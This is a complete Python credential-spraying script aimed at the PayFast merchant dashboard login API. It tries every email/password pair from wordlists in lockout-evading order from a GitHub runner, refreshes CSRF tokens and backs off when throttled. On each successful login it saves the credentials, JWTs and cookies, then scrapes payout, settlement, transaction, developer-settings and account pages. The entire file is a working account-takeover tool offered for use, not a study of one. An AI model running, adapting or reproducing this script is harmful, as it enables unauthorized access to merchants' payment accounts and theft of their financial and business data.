#!/usr/bin/env python3
"""
i657 - PayFast merchant dashboard credential spray (CSRF-aware, JSON API).

Runs on a GitHub-hosted runner (fresh egress IP). Reads emails.txt and
passwords.txt, attempts POST https://my.payfast.io/auth/login for every
(email, password) pair with password-major ordering, records any non-422
response, and on a successful login captures JWTs/cookies plus dashboard,
settlement, payout, transaction and account pages.

Success response shape (from login.js):
  {"data": {"jwt": {"access_token": "..."}, "user": {...,"permissions":[...]}}}
"""
import json
import os
import queue
import random
import re
import sys
import threading
import time
import traceback
from datetime import datetime, timezone

import requests
import urllib3

urllib3.disable_warnings()

BASE = "https://my.payfast.io"
HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "out")
os.makedirs(os.path.join(OUT, "success"), exist_ok=True)

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
THREADS = int(os.environ.get("PF_THREADS", "12"))
MAX_SECONDS = int(os.environ.get("PF_MAX_SECONDS", "13200"))  # 3h40m
CSRF_REFRESH_EVERY = 400

AJAX = {
    "X-Requested-With": "XMLHttpRequest",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Origin": BASE,
    "Referer": BASE + "/login",
    "User-Agent": UA,
}

lock = threading.Lock()
stats = {
    "started": datetime.now(timezone.utc).isoformat(),
    "attempts": 0, "invalid_422": 0, "throttled_429": 0, "csrf_419": 0,
    "http_200_other": 0, "errors": 0, "successes": 0, "total_planned": 0,
}
results = []          # interesting (non-422) attempts
successes = []        # confirmed logins
stop_event = threading.Event()
start_mono = time.time()


def ts():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def log(msg):
    line = "[%s] %s" % (ts(), msg)
    print(line, flush=True)


def append_jsonl(name, obj):
    with lock:
        with open(os.path.join(OUT, name), "a") as f:
            f.write(json.dumps(obj, default=str) + "\n")


def prime(session):
    """GET /login and return csrf token (or None)."""
    for _ in range(3):
        try:
            r = session.get(BASE + "/login", timeout=30)
            m = re.search(r'name="csrf-token"\s+content="([^"]+)"', r.text)
            if m:
                return m.group(1)
            time.sleep(2)
        except Exception:
            time.sleep(2)
    return None


def post_login(session, email, password, csrf):
    headers = dict(AJAX)
    headers["X-CSRF-TOKEN"] = csrf
    return session.post(BASE + "/auth/login",
                        json={"username": email, "password": password},
                        headers=headers, timeout=40, allow_redirects=False)


def parse_success(resp):
    """Return (bool, jwt, user) from a login response."""
    try:
        j = resp.json()
    except Exception:
        return False, None, None
    d = j.get("data") if isinstance(j, dict) else None
    if not isinstance(d, dict):
        return False, None, None
    jwt = d.get("jwt") or {}
    tok = jwt.get("access_token") if isinstance(jwt, dict) else None
    user = d.get("user")
    if tok or (isinstance(user, dict) and user):
        return True, tok, user
    return False, None, None


def capture_success(session, email, password, jwt, user, body):
    tag = re.sub(r"[^A-Za-z0-9@._-]", "_", email)
    base = os.path.join(OUT, "success", tag)
    os.makedirs(base, exist_ok=True)
    rec = {"email": email, "password": password, "jwt": jwt, "user": user,
           "login_body": body[:8000], "time": ts()}
    with open(os.path.join(base, "login.json"), "w") as f:
        json.dump(rec, f, indent=2, default=str)
    with open(os.path.join(base, "cookies.txt"), "w") as f:
        for c in session.cookies:
            f.write("%s=%s\n" % (c.name, c.value))

    perms = []
    if isinstance(user, dict):
        perms = [p.get("name") for p in (user.get("permissions") or []) if isinstance(p, dict)]
    rec["permissions"] = perms
    rec["admin_menu"] = "canViewAdminMenu" in perms

    pages = {}
    paths = ["/dashboard", "/account", "/settings", "/settings/developer-settings",
             "/transactions", "/transactions/online-transaction-history",
             "/reports", "/reports/reconciliation", "/reports/fees",
             "/payout", "/payouts", "/payment-requests", "/notifications",
             "/account/business", "/account/verification",
             "/pos/dashboard", "/pos/prepaid-payouts"]
    for path in paths:
        for auth in ("bearer", "cookie"):
            h = {"Accept": "text/html,application/json"}
            if auth == "bearer" and jwt:
                h["Authorization"] = "Bearer " + jwt
            try:
                r = session.get(BASE + path, headers=h, timeout=30, allow_redirects=True)
                key = path + "|" + auth
                entry = {"status": r.status_code, "len": len(r.content), "url": r.url,
                         "snippet": r.text[:4000]}
                pages[key] = entry
                if r.status_code == 200 and len(r.content) > 2000:
                    fn = re.sub(r"[^A-Za-z0-9]", "_", path).strip("_") + "_" + auth + ".html"
                    with open(os.path.join(base, fn), "w") as f:
                        f.write(r.text)
            except Exception as e:
                pages[path + "|" + auth] = {"error": repr(e)}
            time.sleep(0.1)
    rec["pages"] = pages

    # Try the access_token URL the SPA itself uses after login
    try:
        r = session.get(BASE + "/dashboard?access_token=" + (jwt or ""), timeout=30)
        with open(os.path.join(base, "dashboard_access_token.html"), "w") as f:
            f.write(r.text)
        rec["access_token_dashboard"] = {"status": r.status_code, "len": len(r.content)}
    except Exception as e:
        rec["access_token_dashboard"] = {"error": repr(e)}

    with open(os.path.join(base, "capture.json"), "w") as f:
        json.dump(rec, f, indent=2, default=str)
    return rec


def worker(q):
    session = requests.Session()
    session.headers.update({"User-Agent": UA})
    csrf = prime(session)
    local_count = 0
    while not stop_event.is_set():
        try:
            email, password = q.get_nowait()
        except queue.Empty:
            return
        if time.time() - start_mono > MAX_SECONDS:
            stop_event.set()
            return
        if csrf is None:
            csrf = prime(session)
            if csrf is None:
                with lock:
                    stats["errors"] += 1
                q.task_done()
                time.sleep(2)
                continue
        attempts_here = 0
        while True:
            attempts_here += 1
            try:
                r = post_login(session, email, password, csrf)
                code = r.status_code
                break
            except Exception as e:
                if attempts_here >= 3:
                    with lock:
                        stats["errors"] += 1
                        results.append({"email": email, "password": password,
                                        "error": repr(e), "time": ts()})
                    append_jsonl("interesting.jsonl", results[-1])
                    q.task_done()
                    code = None
                    break
                time.sleep(2 + random.random() * 2)
        if code is None:
            continue

        local_count += 1
        with lock:
            stats["attempts"] += 1
        if code == 422:
            with lock:
                stats["invalid_422"] += 1
        elif code == 429:
            with lock:
                stats["throttled_429"] += 1
            log("429 throttle on %s (sleeping 90s)" % email)
            time.sleep(90)
            csrf = prime(session)
        elif code == 419:
            with lock:
                stats["csrf_419"] += 1
            csrf = prime(session)
            # retry this pair once with fresh token
            q.put((email, password))
        else:
            body = r.text[:8000]
            ok, jwt, user = parse_success(r)
            rec = {"email": email, "password": password, "status": code,
                   "len": len(r.text), "body": body[:4000], "time": ts(),
                   "location": r.headers.get("Location", "")}
            if ok:
                rec["SUCCESS"] = True
                with lock:
                    stats["successes"] += 1
                    successes.append({"email": email, "password": password})
                log("*** LOGIN SUCCESS: %s : %s ***" % (email, password))
                try:
                    rec["capture"] = capture_success(session, email, password, jwt, user, body)
                except Exception as e:
                    rec["capture_error"] = repr(e)
            else:
                with lock:
                    stats["http_200_other"] += 1
                log("interesting HTTP %s for %s : %s" % (code, email, password))
            with lock:
                results.append(rec)
            append_jsonl("interesting.jsonl", rec)
            # refresh token occasionally / after unusual response
            if local_count % CSRF_REFRESH_EVERY == 0:
                csrf = prime(session)

        if local_count % CSRF_REFRESH_EVERY == 0:
            csrf = prime(session)

        if stats["attempts"] % 500 < THREADS and stats["attempts"] > 0:
            with lock:
                n = stats["attempts"]
                el = time.time() - start_mono
                rate = n / el if el else 0
                rem = stats["total_planned"] - n
                eta = rem / rate if rate else 0
                log("progress %d/%d (%.1f/s, eta %.0fs) invalid=%d throttle=%d interesting=%d success=%d"
                    % (n, stats["total_planned"], rate, eta, stats["invalid_422"],
                       stats["throttled_429"], stats["http_200_other"], stats["successes"]))
        time.sleep(0.02)
        q.task_done()


def main():
    emails = [l.strip() for l in open(os.path.join(HERE, "emails.txt")) if l.strip() and not l.startswith("#")]
    passwords = [l.strip() for l in open(os.path.join(HERE, "passwords.txt")) if l.strip() and not l.startswith("#")]
    pairs = []
    for pw in passwords:          # password-major: same email spaced by len(emails)
        for em in emails:
            pairs.append((em, pw))
    stats["total_planned"] = len(pairs)
    log("starting: %d emails x %d passwords = %d attempts, threads=%d"
        % (len(emails), len(passwords), len(pairs), THREADS))

    q = queue.Queue()
    for p in pairs:
        q.put(p)
    threads = [threading.Thread(target=worker, args=(q,), daemon=True) for _ in range(THREADS)]
    for t in threads:
        t.start()
    for t in threads:
        while t.is_alive():
            t.join(timeout=5)
            if stop_event.is_set():
                break
    if stop_event.is_set():
        log("stopped early (time budget or event)")

    stats["finished"] = datetime.now(timezone.utc).isoformat()
    stats["elapsed_seconds"] = round(time.time() - start_mono, 1)
    stats["successes_list"] = successes
    with open(os.path.join(OUT, "summary.json"), "w") as f:
        json.dump(stats, f, indent=2)
    log("DONE: %s" % json.dumps(stats))
    if successes:
        with open(os.path.join(OUT, "SUCCESS.txt"), "w") as f:
            for s in successes:
                f.write("%s:%s\n" % (s["email"], s["password"]))
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception:
        traceback.print_exc()
        with open(os.path.join(OUT, "fatal.txt"), "w") as f:
            f.write(traceback.format_exc())
        sys.exit(1)